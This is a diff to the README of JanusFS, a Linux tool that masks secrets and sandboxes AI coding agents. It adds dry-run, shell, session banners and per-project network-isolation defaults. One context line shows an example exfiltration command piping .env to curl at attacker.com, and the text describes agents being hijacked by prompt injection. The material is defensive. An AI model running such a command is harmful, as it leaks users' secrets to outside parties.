@@ -34,6 +34,8 @@ janusfs check --secrets          # warn about likely secrets still readable
 janusfs explain .env             # trace which rule decides a file's fate
 
 # 4) run your agent INSIDE the boundary (strongest: kernel-enforced)
+janusfs exec --dry-run           # preview: what is protected, hidden, masked — runs nothing
+janusfs shell                    # poke around inside the boundary yourself: cat .env → ****
 janusfs exec -- aider            # the agent + everything it spawns sees the filtered view
 janusfs exec --net=none -- aider # …and cannot reach the network to exfiltrate what it read
 ```
@@ -75,9 +77,24 @@ Pointing an agent *at* a mountpoint only trusts its discipline — nothing stops
 janusfs exec -- aider              # masked tree, host network
 janusfs exec --net=none -- aider   # + no network at all (loopback only)
 janusfs exec --net=host -- claude  # default: share the host network (no isolation)
+janusfs exec --dry-run             # show the plan and every hidden/masked file; run nothing
+janusfs shell --net=none           # an interactive shell inside the same boundary
 ```
 
+**You can see it working.** Every session starts with a two-line banner on stderr naming the protected tree and the network mode (and where that mode came from), and ends with one line of feedback — `3 masked file(s) read (.env, config/app.yml), 1 hidden path(s) denied (id_rsa)` — so there is never any doubt whether the boundary was on. `--quiet`/`-q` silences both; security warnings still print. Inside the boundary the environment carries `JANUSFS_EXEC=1`, so a prompt can show it (bash: `PS1='${JANUSFS_EXEC:+[janusfs] }'"$PS1"`). `janusfs exec --dry-run` (`--json` for scripts) prints what a run *would* do — the protected tree, the network mode, whether this host can enforce at all, and every file that would be hidden or masked — on any OS, including a Mac, before the agent runs on a Linux box. `janusfs doctor` answers "can I sandbox an agent here?" in its first lines. Exit codes follow the `docker run`/`timeout` convention: the child's own code, or `125` when JanusFS itself could not start, `126` when the command cannot be executed, `127` when it is not found.
+
+**Per-project defaults.** A project can declare its exec defaults in `.janusfs.yml`:
+
+```yaml
+exec:
+  net: none      # every `janusfs exec`/`janusfs shell` in this repo is network-isolated
+```
+
+A project can only *tighten*: `net: none` turns isolation on by default, while `net: host` never loosens a `none` set machine-wide in `~/.janusfs/settings.json` or `JANUSFS_EXEC_NET`. An explicit `--net=host` on the command line still wins (you are at the keyboard), with a one-line note that the project asked for otherwise.
+
 **A second layer: cut the network too.** Masking keeps secret *bytes* out of the agent; `--net=none` keeps whatever it *did* read from leaving the box. It runs the process tree in a network namespace with only a loopback interface and no external route — deny-all, kernel-enforced, so a leaked secret has nowhere to go. This is deny-all, not an egress allowlist (that is the container's job). The default is `host` (no isolation); opt in per run, or set `exec_net` in `~/.janusfs/settings.json`.
+
+**How it compares.** No other tool masks secrets in place at the filesystem layer with the file's shape preserved; the alternatives deny the file, swap in a different-length sentinel behind a proxy, or redact inside one agent tool that `cat` and `grep` bypass. The survey, with links, and how the top user complaints about agent sandboxes map onto `janusfs exec`'s behaviour: [`docs/LANDSCAPE.md`](docs/LANDSCAPE.md).
 
 **Why not just a sandbox?** A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Deny `.env` and the agent breaks when it needs the file's shape; allow it, and one prompt injection later `cat .env | curl attacker.com` exfiltrates it. Run both. **Non-Linux is refused, not faked** — use a Linux container/VM. Details on the [docs site](https://sarathsp06.github.io/janusfs#enforce); a path-preserving macOS mode was considered and rejected in [`SPEC.md`](SPEC.md) §20.
 
@@ -100,8 +117,9 @@ janusfs exec --net=host -- claude  # default: share the host network (no isolati
 | `janusfs check [path]` | Static linter: unknown builtins, bad regex (with its fail-closed consequence), directory-mask globs that can never mask, no-op negations. `--secrets` adds a heuristic scan for likely-Allowed secrets; `--matches` lists Hidden/Masked files; `--json`. |
 | `janusfs patterns` | List every reserved built-in mask pattern with its regex. `--json`. |
 | `janusfs explain <path>` | Trace why one path resolves the way it does; prints every contributing rule. `--json`, `--root`. |
-| `janusfs doctor` | Runtime health: FUSE status, active mounts, stale-mount/watchdog checks. |
-| `janusfs exec [--net=host\|none] -- <command> [args...]` | Run a command inside a real, kernel-enforced view of the current source tree (private mount namespace; no daemon required). `--net=none` denies all network (loopback only). Linux-only: refuses on other OSes. |
+| `janusfs doctor` | Runtime health: whether `janusfs exec` can enforce here (with the remedy if not), FUSE status, active mounts, stale-mount/watchdog checks. |
+| `janusfs exec [--net=host\|none] [--quiet] [--dry-run [--json]] -- <command> [args...]` | Run a command inside a real, kernel-enforced view of the current source tree (private mount namespace; no daemon required). `--net=none` denies all network (loopback only). `--dry-run` previews the boundary without running anything (works on any OS). Prints a start banner and an end-of-session summary unless `--quiet`. Linux-only: refuses on other OSes. |
+| `janusfs shell [--net=host\|none] [--quiet]` | Open `$SHELL` inside the same boundary, to check a policy by hand. Same flags as `exec`. |
 
 All commands support `--help` and script-friendly exit codes; errors print as a one-line cause, never a Go stack trace.
 
